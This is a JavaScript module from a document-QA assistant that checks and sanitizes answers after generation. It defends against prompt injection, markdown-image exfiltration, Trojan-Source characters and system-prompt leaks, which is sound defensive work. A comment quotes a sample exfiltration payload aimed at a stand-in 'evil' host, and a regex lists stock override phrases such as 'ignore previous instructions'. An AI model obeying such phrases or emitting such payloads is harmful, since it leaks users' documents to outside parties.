'use strict';

// ── verify — deterministic post-answer verification ──────────────────────────
//
// A small set of checks every grounded answer passes through AFTER the model writes it
// but BEFORE it reaches the user. All of it is plain code — no model call — so it is free,
// runs on every answer, and can never rubber-stamp a mistake the way a weak local judge
// (the opt-in "Verify" faithfulness pass) can. It complements, not replaces, that judge:
// the judge grades entailment; this catches the mechanical failures a small model makes.
//
// It is built as a self-registering REGISTRY (the same shape as the boot-time Watchdog in
// lib/watchdog.js): a check registers itself with `register(name, fn)` and `evaluate()`
// runs every one. Adding a check later is a single call — no edit to the runner or the
// caller. Design rules kept deliberately strict so this layer can never harm an answer:
//
//   • READ-ONLY and TOTAL. It never calls a model, never touches retrieval, and never
//     throws into its caller — a check that throws is caught and ignored, and `finalize`
//     returns the original answer on any failure. It can only ever improve an answer.
//   • Each check is `fn({ answer, sourcesText, question }) -> violation | violation[] | null`,
//     where a violation is `{ severity, detail, redact?, correct? }`:
//       - 'redact'  : a specific template token must be removed (carried in `redact`);
//       - 'correct' : a stated value is wrong and can be fixed in place (`correct.find/replace`);
//       - 'caveat'  : the answer may carry an unsupported figure; a short note is appended
//                     (suppressed when the Verify badge is already showing, to avoid two signals).

// ── Registry ─────────────────────────────────────────────────────────────────
// Registration/listing come from the shared factory (lib/registry.js); the runner below
// (evaluate) is verify's own — synchronous, composing violations rather than logging.
const { register, list, items: checks } = require('./registry').makeRegistry();
// Shared with snippet.js so the zero-width/bidi "Trojan-Source" strip can't drift between the answer-egress
// sanitizer and the citation-snippet builder (single-sourced in constants.js).
const { stripInvisibleChars } = require('./constants');

// Run every registered check over one answer. Never throws; a check that throws is skipped.
function evaluate(context) {
  const ctx = context || {};
  const violations = [];
  for (let i = 0; i < checks.length; i++) {
    try {
      const res = checks[i].fn(ctx);
      const arr = Array.isArray(res) ? res : (res ? [res] : []);
      arr.filter(Boolean).forEach(v => violations.push({
        check: checks[i].name,
        severity: v.severity || 'caveat',
        detail: v.detail || '',
        redact: v.redact || null,
        correct: v.correct || null,
      }));
    } catch (e) { /* a check must never break the answer */ }
  }
  return violations;
}

// ── Egress sanitizing ────────────────────────────────────────────────────────
// Strip exfiltration/rendering vectors from the outgoing answer, so the answer is safe for EVERY consumer
// — Lokyni's own UI, the OpenAI-compatible HTTP API, and MCP agents — not only the in-app renderer. It
// removes raw HTML media/script tags; neutralizes markdown media, because a remote image an injected
// document plants ("![x](https://evil/?d=SECRET)") would be auto-fetched by an outside markdown renderer
// and leak sibling-document text in the URL (Lokyni's own renderer prints alt text and never fetches, but
// an API/MCP consumer's does not); defangs dangerous non-http link schemes (javascript:/data:/vbscript:/
// file:); strips the leaked untrusted-content fence marker; and removes the genuinely-dangerous invisible
// characters — the zero-width space, BOM/word-joiner, the LRM/RLM marks, and the bidi embeddings, overrides,
// and isolates used for Trojan-Source-style spoofing. It deliberately leaves ZWJ/ZWNJ (U+200C/U+200D) alone,
// which emoji sequences and Persian/Arabic/Indic text need, and never touches ordinary http(s) links (a
// reader clicks those; they do not auto-fetch).
// The invisible/bidi "Trojan-Source" strip is single-sourced as `stripInvisibleChars` in constants.js
// (imported above) so it can never drift from snippet.js's citation-snippet builder.
// The per-turn fence delimiter that wraps untrusted retrieved content in the prompt
// (`fenceUntrustedDocs` in lib/llm.js builds `UNTRUSTED_DOCS_<12 hex>`, upper-cased). A small
// model sometimes echoes this marker into the answer \u2014 as a bare token treated like a
// citation ("(paragraph 2, UNTRUSTED_DOCS_ABC\u2026) mentions\u2026") or as its surrounding tag. It is
// an internal delimiter and must never appear in a rendered answer, so strip both forms here.
// Matched case-insensitively for robustness even though the generator emits upper-case hex.
const FENCE_MARKER_RE = /<\/?UNTRUSTED_DOCS_[0-9A-Fa-f]{12}>|UNTRUSTED_DOCS_[0-9A-Fa-f]{12}/g;
// Markdown media/link neutralizers. Applied so the egress guarantee doesn't depend on WHICH renderer a
// consumer uses. An image becomes inert alt text (no URL for any renderer to auto-fetch); a link with a
// dangerous scheme keeps its visible text but loses the URL.
//
// Deliberately applied to the WHOLE answer, including inside code spans, and NOT via a "skip code regions"
// heuristic. Markdown parsing is ambiguous (mismatched backtick runs, indented fences, etc.), so any
// heuristic that decides a span is "code, therefore inert" can diverge from a real consumer's renderer —
// a crafted `` ```![](evil)`` `` would be skipped here yet rendered by the consumer, reopening the exfil
// hole. Neutralizing unconditionally is the only bypass-proof choice. The cost is small and rare for a
// document-QA tool: an answer that literally teaches markdown image syntax shows the neutralized form.
// Covers inline images `![alt](url)`, reference images `![alt][ref]`, and shortcut images `![alt]`.
const MD_IMAGE_RE = /!\[([^\]]*)\](\([^)]*\)|\[[^\]]*\])?/g;
const MD_DANGEROUS_LINK_RE = /\[([^\]]*)\]\(\s*(?:javascript|data|vbscript|file):[^)]*\)/gi;   // [text](evil:...) → text
function sanitizeEgress(text) {
  let out = String(text || '');
  // Strip invisible/bidi controls FIRST, before the tag/image/link neutralizers. If this ran last, an
  // attacker could hide a zero-width or bidi char inside a construct's token structure (e.g. a U+200B between
  // `!` and `[` of a markdown image, or after `<` of an <img> tag) so the neutralizer's pattern fails to
  // match, and then this strip would remove the char and reconstitute the live, renderable exfiltration
  // construct for any external API/MCP consumer. Removing the invisibles first makes the constructs visible to
  // the neutralizers that follow, closing the bypass. (The in-app renderer is hardened independently.)
  out = stripInvisibleChars(out);                                                               // invisible/bidi controls
  out = out.replace(/<\s*(?:img|script|iframe|object|embed|audio|video|source)\b[^>]*>/gi, ''); // media/script tags
  out = out.replace(MD_IMAGE_RE, (_m, alt) => (alt && alt.trim() ? `[image: ${alt.trim()}]` : '[image]')); // no auto-fetch URL
  out = out.replace(MD_DANGEROUS_LINK_RE, '$1');                                                // drop dangerous link URLs
  const beforeFence = out;
  out = out.replace(FENCE_MARKER_RE, '');                                                       // leaked untrusted-content fence marker
  if (out !== beforeFence) {
    // A marker removed from mid-sentence can leave a small artifact ("(paragraph 2, )", a
    // space before punctuation, or a doubled space). Tidy ONLY when a marker was actually
    // stripped, so ordinary answers (including code with intentional spacing) are untouched.
    out = out
      .replace(/([,;])\s*([)\].,;:])/g, '$2')  // a separator left dangling before a bracket/punctuation
      .replace(/\(\s*\)|\[\s*\]/g, '')         // a now-empty parenthetical/bracket
      .replace(/[ \t]+([),.;:])/g, '$1')       // space now sitting before punctuation
      .replace(/[ \t]{2,}/g, ' ');             // a doubled space left in its place
  }
  return out;
}

// ── Document prompt-injection: detect an answer that OBEYED a document instruction ─────────────
// A retrieved document may try to make the assistant output a chosen string ("reply with exactly the word X
// and nothing else", "say X", "output X") — OWASP LLM01. The grounding rules + the in-turn reminder tell the
// model to ignore it, but a small local model sometimes complies anyway. This is the deterministic backstop:
// extract the string(s) a document DEMANDS, and flag an answer that merely reproduces one.
//
// Precision matters: we match the DEMANDED payload, not just "a short answer" — so a legitimate short answer is
// never refused, even when an injection document is only a co-source, and a longer answer that merely mentions
// the attempt (e.g. "the file tries to make me say X, which I won't") is NOT flagged (it isn't dominated by X).
// Demands are only extracted from a sentence that also carries an injection marker, so an ordinary document
// imperative ("reply within 30 days") is never treated as a demanded payload.
const INJECTION_MARKER_RE = /(?:ignore (?:all |any )?(?:previous|prior|above|the|your) (?:instructions|rules|prompts?)|disregard (?:the|your|all|any|previous|above|everything)|system override|this is (?:a |an )?(?:system )?override|you must (?:now )?(?:reply|respond|say|output|print|write|answer)|reply with exactly|say exactly|output (?:the word|exactly|your)|print (?:the word|exactly|your)|and nothing else|new instructions?\s*:|override(?:s)? (?:all|your|the))/i;
// Within an injection sentence, the string the document tells the assistant to produce.
const INJECTION_DEMAND_RE = /\b(?:reply|respond|answer|say|output|print|write|return|repeat|type)\b(?:\s+(?:with|back|now|exactly|only|just|the\s+(?:word|phrase|text|string|following)))*\s*[:="'`]?\s*([^\n"'`]{2,100}?)\s*(?:["'`]|\s+and\s+nothing\s+else|[.!?\n]|$)/i;
// Split into sentence-ish units so a marker and its demand are scoped to the same clause.
function injectionDemands(docsText) {
  const t = String(docsText || '');
  if (!t || t.length > 2_000_000) return [];        // bound the scan (never OOM on a pathological doc)
  if (!INJECTION_MARKER_RE.test(t)) return [];       // fast path: no injection marker anywhere → nothing to extract
  const out = new Set();
  const units = t.split(/(?<=[.!?])\s+|\n+/);
  for (const u of units) {
    if (out.size >= 20) break;
    if (u.length > 1000 || !INJECTION_MARKER_RE.test(u)) continue;   // a demand is a short imperative sentence
    const m = INJECTION_DEMAND_RE.exec(u);
    if (m && m[1]) {
      const p = m[1].trim().replace(/\s+(?:and\s+nothing\s+else|only|verbatim|exactly).*$/i, '').trim().toLowerCase();
      if (p.length >= 2 && p.length <= 100) out.add(p);
    }
  }
  return [...out];
}
// True when the answer IS (or is dominated by) a demanded payload — i.e. the model obeyed the document.
function answerObeysInjection(answer, demands) {
  if (!Array.isArray(demands) || !demands.length) return false;
  const a = String(answer || '').trim().toLowerCase().replace(/^[\s."'`*]+|[\s."'`*]+$/g, '');
  if (!a) return false;
  for (const d of demands) {
    const dn = d.replace(/^[\s."'`*]+|[\s."'`*]+$/g, '');
    if (dn.length < 2) continue;
    if (a === dn) return true;                                   // the answer IS the payload
    if (a.length <= dn.length + 20 && a.includes(dn)) return true;   // a short answer dominated by it ("X." / "The answer is X")
  }
  return false;
}
// The user-facing decline when a document tried to hijack the answer. In a data file with the other prompt text.
const INJECTION_REFUSAL = require('./promptdata').read('injection-refusal.txt')
  || 'One of the documents tried to give me instructions, so I did not follow it. Ask me a question about the documents and I’ll answer from them.';

// ── System-prompt leak canary ────────────────────────────────────────────────
// Detect an answer that reproduces the fixed grounding rules verbatim (OWASP LLM07). The
// corpus is built once from the exact rule text the prompt uses, minus any shingle that
// also appears in text the assistant is MEANT to say (the two canned refusal lines are
// quoted inside the rules), so a legitimate refusal never reads as a leak.
//
// Crucially it requires SEVERAL distinct matching shingles, not one. The rules contain
// ordinary instructional clauses ("never invent titles, dates, names…"), so a genuine
// answer — or one summarizing a document that gives similar editorial guidance — can share
// a single 8-word run by coincidence; discarding a good answer over that is far worse than
// missing a leak the rules don't even keep secret. A real dump reproduces the whole block
// (dozens of shingles), so a high threshold catches it while a chance clause never trips.
const LEAK_MIN_SHINGLES = 5;
const SHINGLE_N = 8;
const normWords = (s) => String(s || '').toLowerCase().replace(/[^a-z0-9]+/g, ' ').trim().split(/\s+/).filter(Boolean);
const shinglesOf = (s) => {
  const w = normWords(s), out = new Set();
  for (let i = 0; i + SHINGLE_N <= w.length; i++) out.add(w.slice(i, i + SHINGLE_N).join(' '));
  return out;
};
let _leakShingles = null;
function leakShingles() {
  if (_leakShingles) return _leakShingles;
  let rules = '';
  try { rules = require('./llm').GROUNDING_RULES || ''; } catch (e) { rules = ''; }
  const corpus = shinglesOf(rules);
  // Prune shingles the assistant may legitimately say (the refusal lines live inside the rules).
  const allowed = shinglesOf(
    "I don't have that information in my documents. " +
    'I can only answer questions about the documents in my knowledge base.'
  );
  allowed.forEach(s => corpus.delete(s));
  _leakShingles = corpus;
  return corpus;
}
function detectSystemPromptLeak(answer) {
  const set = leakShingles();
  if (!set.size) return false;
  let hits = 0;
  for (const s of shinglesOf(answer)) {
    if (set.has(s) && ++hits >= LEAK_MIN_SHINGLES) return true;
  }
  return false;
}

// ── Checks ───────────────────────────────────────────────────────────────────

// NOTE: there is deliberately no "template placeholder" redaction and no "figure must
// appear verbatim in the sources" check. Both looked reasonable but corrupt CORRECT answers
// in a prose/document RAG: a snake_case angle-bracket slot (<db_user>, <access_token>,
// <first_name>) is legitimate content the model correctly quotes from an API/DB/mail-merge
// document, and a figure the model DERIVES (a sum, a conversion) never appears as a literal
// substring of a passage. There is no reliable deterministic way to tell those from a real
// mistake, and wrongly rewriting a correct answer is worse than missing a rare bad one, so
// neither check exists. Claim-level grounding is the job of the opt-in Verify (faithfulness)
// judge, which reasons about entailment rather than string-matching.

// arithmetic — verify a piece of arithmetic the answer states OUT LOUD and correct a wrong
// result in place. A small model often states the right method ("1.5 to the power of 4") but
// computes it wrong ("= 3.375"). Because the operation is explicit we recompute it and fix
// only the result, and only for a GROSS error (well beyond rounding), so a legitimately
// rounded figure is left alone.
function tidyNumber(n) {
  if (!Number.isFinite(n)) return null;
  let s = (Math.round(n * 1e6) / 1e6).toString();
  if (s.indexOf('.') !== -1) s = s.replace(/0+$/, '').replace(/\.$/, '');
  return s;
}
register('arithmetic', function (ctx) {
  const answer = String(ctx.answer || '');
  if (!answer) return null;
  const num = '(-?\\d+(?:\\.\\d+)?)';
  // The result must be introduced by an explicit equals/is phrase — NOT a bare colon, which
  // could pair "N times M" with an unrelated list/label value on the next line and rewrite it.
  const result = '\\s*(?:is|=|equals|comes to|gives|would be|becomes)\\s*' + num;
  const patterns = [
    { op: 'pow', re: new RegExp(num + '\\s*(?:\\^|\\*\\*|to the power of|raised to the power(?:\\s+of)?)\\s*' + num + result, 'i') },
    { op: 'mul', re: new RegExp(num + '\\s*(?:\\*|×|times|multiplied by)\\s*' + num + result, 'i') },
  ];
  for (let i = 0; i < patterns.length; i++) {
    const m = patterns[i].re.exec(answer);
    if (!m) continue;
    const a = Number(m[1]), b = Number(m[2]), claimed = Number(m[3]);
    if (![a, b, claimed].every(Number.isFinite)) continue;
    const real = patterns[i].op === 'pow' ? Math.pow(a, b) : (a * b);
    if (!Number.isFinite(real)) continue;
    const denom = Math.abs(real) > 1e-9 ? Math.abs(real) : 1;
    if (Math.abs(real - claimed) / denom <= 0.01 || Math.abs(real - claimed) <= 0.001) continue;
    const fixed = tidyNumber(real);
    if (fixed == null) continue;
    const corrected = m[0].replace(new RegExp('(' + result + ')$'), (whole) => whole.replace(String(m[3]), fixed));
    return {
      severity: 'correct',
      detail: 'computed ' + a + (patterns[i].op === 'pow' ? '^' : '×') + b + ' as ' + claimed + ' but it is ' + fixed,
      correct: { find: m[0], replace: corrected },
    };
  }
  return null;
});

// ── finalize ─────────────────────────────────────────────────────────────────

// The user-facing strings live as data files (lib/ai/data/) alongside the prompt text,
// so the wording is edited in one place rather than hardcoded here. A detected leak is
// replaced with a neutral decline rather than shipped; the literal fallback guards the
// (shouldn't-happen) missing-file case — promptdata.read returns '' then, and replacing a
// leak with an EMPTY answer would be worse than a plain decline.
const LEAK_REFUSAL = require('./promptdata').read('leak-refusal.txt')
  || 'I can only answer questions about the documents in my knowledge base.';

// Run the post-answer pass over a completed answer and return the finalized text. Operates
// on the answer text alone — the remaining checks (egress sanitize, leak canary, arithmetic)
// need nothing else. Never throws: returns the input on any error, so a bug here can never
// block or corrupt an answer. The registry's redact/caveat severities are still handled so a
// future check can use them, though none currently do.
function finalize(answer) {
  try {
    let out = sanitizeEgress(answer);
    if (out.trim() && detectSystemPromptLeak(out)) return LEAK_REFUSAL;
    if (!out.trim()) return out;
    for (const v of evaluate({ answer: out })) {
      if (v.severity === 'correct' && v.correct && v.correct.find && out.indexOf(v.correct.find) !== -1) {
        out = out.split(v.correct.find).join(v.correct.replace);
      } else if (v.severity === 'redact' && Array.isArray(v.redact)) {
        for (const tok of v.redact) { if (tok) out = out.split(tok).join('[unavailable]'); }
      }
    }
    return out;
  } catch (e) { return String(answer || ''); }
}

module.exports = { register, list, evaluate, finalize, sanitizeEgress, detectSystemPromptLeak, injectionDemands, answerObeysInjection, INJECTION_REFUSAL };
